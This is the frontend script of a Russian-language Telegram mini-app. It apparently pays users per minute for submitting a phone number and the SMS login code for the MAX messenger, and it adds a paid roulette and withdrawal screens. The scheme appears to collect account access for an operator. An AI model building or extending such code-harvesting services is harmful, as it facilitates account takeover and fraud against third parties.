// ===== Config =====
const API_BASE = "https://genre-considers-medications-rapids.trycloudflare.com";

// ===== Shortcuts =====
const $ = sel => document.querySelector(sel);
function escapeHtml(s){return (s??"").replace(/[&<>"']/g,m=>({ "&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;" }[m]))}
function ripple(e,ev){e.classList.add("rippling");const r=e.getBoundingClientRect();e.style.setProperty("--rx",(ev.clientX-r.left)+"px");e.style.setProperty("--ry",(ev.clientY-r.top)+"px");setTimeout(()=>e.classList.remove("rippling"),300)}
document.addEventListener("click",e=>{if(e.target.tagName==="BUTTON") ripple(e.target,e)});

// ===== Telegram WebApp =====
const tg = window.Telegram?.WebApp; tg && tg.expand();
const auth = tg?.initDataUnsafe?.user || {};
const user_id = auth.id || window.USER_ID || 0;
const username = auth.username || auth.first_name || "user";

// ===== Notify =====
const Notify = (() => {
  const root = document.getElementById("notify-root");
  const modal = document.getElementById("notify-modal");
  const mTitle = document.getElementById("notify-title");
  const mCont  = document.getElementById("notify-content");
  const mClose = document.getElementById("notify-close");
  mClose.onclick = () => hideModal();

  function toast(msg, {title="", type="info", timeout=2500} = {}){
    const el = document.createElement("div");
    el.className = `notif ${type}`;
    el.innerHTML = `<div>${title ? `<div class="title">${escapeHtml(title)}</div>`:""}<div class="msg">${escapeHtml(msg)}</div></div><button class="x" aria-label="Закрыть">×</button>`;
    el.querySelector(".x").onclick = () => remove();
    root.appendChild(el);
    let t = setTimeout(remove, timeout);
    function remove(){ clearTimeout(t); if(el.parentNode) el.parentNode.removeChild(el); }
    return {close: remove};
  }
  function showModal({title="Сообщение", html="", onClose=null}={}){ mTitle.textContent=title; mCont.innerHTML=html; modal.classList.remove("hidden"); modal.setAttribute("aria-hidden","false"); mClose.onclick=()=>{hideModal(); onClose&&onClose();}; }
  function hideModal(){ modal.classList.add("hidden"); modal.setAttribute("aria-hidden","true"); }
  return { toast, info:(m,o)=>toast(m,{...o,type:"info"}), success:(m,o)=>toast(m,{...o,type:"success"}), error:(m,o)=>toast(m,{...o,type:"error"}), modal: showModal, close: hideModal };
})();

// ===== HTTP =====
async function post(path, data){
  try{
    const res = await fetch((API_BASE||"")+"/api"+path, {
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body: JSON.stringify({ initData: tg?.initData, user_id, username, ...data })
    });
    return await res.json();
  }catch(e){
    Notify.error("Нет связи с сервером");
    return {ok:false,error:"NETWORK"};
  }
}

// ===== Навигация (всегда один экран) =====
function show(id){
  document.querySelectorAll(".card").forEach(el=>{
    el.classList.add("hidden");
    el.setAttribute("aria-hidden","true");
  });
  const el = (id==="menu") ? $("#menu") : $("#screen-"+id);
  if(!el) return;
  el.classList.remove("hidden");
  el.setAttribute("aria-hidden","false");

  if(id==="stats")    loadStats();
  if(id==="report")   loadReport();
  if(id==="roulette") setupRoulette();
  if(id==="priv")     loadPriv();
}
document.querySelectorAll('[data-screen]').forEach(b=>b.onclick=()=>show(b.dataset.screen));
document.querySelectorAll('.back').forEach(b=>b.onclick=()=>show("menu"));

// ===== Логи =====
async function loadLogs(){
  const j = await post("/logs", {});
  const box = $("#chat"); if(!box) return;
  box.innerHTML = "";
  (j.events||[]).forEach(e=>{
    const div = document.createElement("div");
    div.className = "bubble " + (e.role==="user"?"b-user":e.role==="admin"?"b-admin":"b-system");
    div.innerHTML = escapeHtml(e.text) + `<div class="meta">${escapeHtml(e.ts)}</div>`;
    box.appendChild(div);
  });
  box.scrollTop = box.scrollHeight;
}
$("#refreshLogs")?.addEventListener("click", loadLogs);

// ===== Статистика =====
async function loadStats(){
  const j = await post("/stats",{});
  const s = j.stats||{};
  $("#statsBox").textContent =
`Пользователь: ${username}
ID: ${user_id}
Регистрация: ${s.first_seen||"—"}
Успешных номеров: ${s.success_count||0}
Неуспешных номеров: ${s.fail_count||0}
Всего заработано: ${Number(s.earned||0).toFixed(2)}
Баланс: ${Number(s.balance||0).toFixed(2)}
Рулетка: куплено $${Number(s.spent_roulette||0).toFixed(2)} • выигрыши $${Number(s.won_roulette||0).toFixed(2)}
Тариф: ${s.plan||"standard"}${s.plan_until?` • до ${s.plan_until}`:""}
`;
}

// ===== Сдать MAX =====
let submission_id = 0;
$("#sendPhone")?.addEventListener("click", async () => {
  const phone = $("#phone").value.trim();
  if(!phone){ Notify.info("Введите номер"); $("#phone").focus(); return; }
  const j = await post("/submit_phone",{phone});
  if(j.ok){
    submission_id = j.submission_id;
    const p=$("#codePanel"); p.classList.remove("hidden"); p.setAttribute("aria-hidden","false");
    const ci=$("#code"); ci.value=""; ci.disabled=false; setTimeout(()=>ci.focus({preventScroll:true}),0);
    Notify.success("Номер отправлен. Введите код из SMS.");
    loadLogs();
  } else {
    Notify.error("Ошибка отправки номера");
  }
});
$("#sendCode")?.addEventListener("click", async () => {
  const ci=$("#code"); const code=ci.value.trim();
  if(!submission_id){ Notify.info("Сначала отправьте номер телефона"); return; }
  if(!code){ Notify.info("Введите код"); ci.focus(); return; }
  const j=await post("/submit_code",{submission_id,code});
  if(j.ok){
    Notify.success("Код отправлен. Ожидайте решения.");
    $("#phone").value=""; ci.value=""; $("#codePanel").classList.add("hidden"); $("#codePanel").setAttribute("aria-hidden","true");
    show("menu"); loadLogs();
  } else {
    Notify.error("Ошибка отправки кода");
  }
});

// ===== Отчёт =====
async function loadReport(){
  const j = await post("/my_numbers",{});
  const box = $("#reportList"); box.innerHTML="";
  (j.rows||[]).forEach(r=>{
    const div=document.createElement("div");
    div.className="bubble b-system";
    div.innerHTML = `#${r.id} • ${escapeHtml(r.phone)} • ${r.status} • ${r.minutes} мин • $${Number(r.earned).toFixed(2)}`;
    box.appendChild(div);
  });
}
$("#reportRefresh")?.addEventListener("click", loadReport);

// ===== Рулетка (кейс-лента) =====
let ruReady=false, ruBusy=false;
function setupRoulette(){ if(ruReady) return; ruReady=true; }
function buildStrip(win, n=72){
  const arr=[]; for(let i=0;i<n;i++){ const v = (Math.random()<0.6? (Math.random()*0.6+0.1) : (Math.random()*0.9+0.6)).toFixed(2); arr.push(v); }
  arr[n-1]=Number(win).toFixed(2); return arr;
}
function renderStrip(vals){
  const strip=$("#case-strip"); strip.innerHTML="";
  vals.forEach(v=>{ const t=document.createElement("div"); t.className="case-tile"; t.innerHTML=`<div class="icon">$</div>$${v}`; strip.appendChild(t); });
  strip.style.transform="translateX(0)";
}
function animateToLast(done){
  const strip=$("#case-strip");
  const tiles=strip.children;
  const totalWidth = Array.from(tiles).reduce((s,t)=>s+t.offsetWidth+10,0);
  const view = strip.parentElement.clientWidth;
  const target = -(totalWidth - view - 12);
  strip.animate([{transform:"translateX(0)"},{transform:`translateX(${target}px)`}],{duration:3400,easing:"cubic-bezier(.2,.9,.1,1)"}).onfinish=()=>{
    strip.style.transform=`translateX(${target}px)`; done&&done();
  };
}
$("#ru-spin")?.addEventListener("click", async ()=>{
  if(ruBusy) return; ruBusy=true; $("#ru-result").textContent="Покупка…";
  const res = await post("/roulette_spin",{});
  if(!res.ok){
    ruBusy=false;
    if(res.error==="NO_FUNDS") { Notify.error("Недостаточно средств: нужно $1"); loadLogs(); }
    else { Notify.error("Ошибка рулетки"); }
    return;
  }
  const strip = buildStrip(Number(res.win), 72);
  renderStrip(strip);
  $("#ru-result").textContent="Крутится…";
  animateToLast(()=>{
    $("#ru-result").textContent = `Выигрыш: $${Number(res.win).toFixed(2)} • Баланс: $${Number(res.balance).toFixed(2)}`;
    ruBusy=false; loadStats(); loadLogs();
    Notify.info(`Выигрыш: $${Number(res.win).toFixed(2)}`);
  });
});

// ===== Привилегии =====
async function loadPriv(){
  const r = await post("/priv/info",{});
  const p = r.plan||{};
  const rate = Number(r.rate||0).toFixed(2);
  $("#privSummary").textContent = `Тариф: ${p.plan||"standard"} • Ставка: $${rate}/мин • Действует до: ${p.plan_until||"—"}`;

  const isPrem = p.plan==="premium" && !!p.plan_until;
  const isSpeed= p.plan==="speed"   && !!p.plan_until;
  const isStd  = !isPrem && !isSpeed;

  // Premium
  const premPrice = $("#price-premium");
  const premBtn   = $("#buy-premium");
  if(isPrem){
    premPrice?.classList.add("hidden");
    premBtn.textContent = "Активен";
    premBtn.disabled = true;
    premBtn.classList.add("btn-active");
  }else{
    premPrice?.classList.remove("hidden");
    premBtn.textContent = "Купить";
    premBtn.disabled = false;
    premBtn.classList.remove("btn-active");
  }

  // Speed
  const speedPrice = $("#price-speed");
  const speedBtn   = $("#buy-speed");
  if(isSpeed){
    speedPrice?.classList.add("hidden");
    speedBtn.textContent = "Активен";
    speedBtn.disabled = true;
    speedBtn.classList.add("btn-active");
  }else{
    speedPrice?.classList.remove("hidden");
    speedBtn.textContent = "Купить";
    speedBtn.disabled = false;
    speedBtn.classList.remove("btn-active");
  }

  // Standard
  const stdPrice = $("#price-standard");
  const stdBtn   = $("#std-activate");
  if(isStd){
    stdPrice?.classList.add("hidden");
    stdBtn.textContent = "Активен";
    stdBtn.disabled = true;
    stdBtn.classList.add("btn-active");
  }else{
    stdPrice?.classList.remove("hidden");
    stdBtn.textContent = "Активировать";
    stdBtn.disabled = false;
    stdBtn.classList.remove("btn-active");
  }
}
$("#buy-premium")?.addEventListener("click", async ()=>{
  const res = await post("/priv/buy",{plan:"premium"});
  if(!res.ok){ return Notify.error(res.error==="NO_FUNDS"?"Недостаточно средств ($40)":"Ошибка покупки"); }
  Notify.success("Премиум активирован на 30 дней");
  loadStats(); loadPriv(); loadLogs();
});
$("#buy-speed")?.addEventListener("click", async ()=>{
  const res = await post("/priv/buy",{plan:"speed"});
  if(!res.ok){ return Notify.error(res.error==="NO_FUNDS"?"Недостаточно средств ($30)":"Ошибка покупки"); }
  Notify.success("Speed активирован на 30 дней");
  loadStats(); loadPriv(); loadLogs();
});
$("#std-activate")?.addEventListener("click", async ()=>{
  const res = await post("/priv/activate_standard",{});
  if(!res.ok){ return Notify.error("Ошибка активации"); }
  Notify.info(`Возврат: $${Number(res.refund||0).toFixed(2)}`);
  loadStats(); loadPriv(); loadLogs();
});

(() => {
  const tg = window.Telegram?.WebApp;
  const initData = tg?.initData || new URLSearchParams(location.search).get("initData") || "";
  const $ = (q) => document.querySelector(q);
  const toast = (s) => { try { notify(s); } catch { alert(s); } };

  async function post(url, data) {
    const r = await fetch(url, {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify(Object.assign({initData}, data||{}))
    });
    return r.json();
  }

  // показать баланс на экране вывода
  function refreshWithdrawBalance() {
    post("/api/stats").then(res => {
      if (res?.ok && res.stats) $("#wdBalance").textContent = (res.stats.balance ?? 0).toFixed(2);
    }).catch(()=>{});
  }

  // навешай на кнопку "Вывод средств" из главного меню если у тебя есть роутинг по data-screen
  const scr = $("#screen-withdraw");
  if (scr) {
    // когда экран показывают — обнови баланс
    const obs = new MutationObserver(() => {
      const hidden = scr.classList.contains("hidden") || scr.getAttribute("aria-hidden")==="true";
      if (!hidden) refreshWithdrawBalance();
    });
    obs.observe(scr, { attributes:true, attributeFilter:["class","aria-hidden"] });

    $("#wdSend").addEventListener("click", async () => {
      const v = parseFloat($("#wdAmount").value.replace(",", "."));
      if (!isFinite(v)) return toast("Введите сумму");
      if (v < 5 || v > 100) return toast("Допустимо от $5 до $100");
      const res = await post("/api/withdraw_request", { amount: v });
      if (!res.ok) {
        const e = res.error || "ERR";
        if (e === "NO_FUNDS") return toast("Недостаточно средств");
        if (e === "PENDING_EXISTS") return toast("У вас уже есть активная заявка");
        if (e === "AMOUNT_RANGE") return toast("Сумма вне диапазона");
        return toast("Ошибка: " + e);
      }
      $("#wdAmount").value = "";
      refreshWithdrawBalance();
      toast("Заявка отправлена админам");
    });

    $("#wdCancel").addEventListener("click", async () => {
      const res = await post("/api/withdraw_cancel");
      if (res.ok) { toast("Заявка отменена"); refreshWithdrawBalance(); }
      else { toast(res.error === "NO_PENDING" ? "Активной заявки нет" : "Не удалось отменить"); }
    });
  }
})();

// ===== Bootstrap =====
(async ()=>{
  await post("/bootstrap",{});
  loadStats();
  loadLogs();
})();




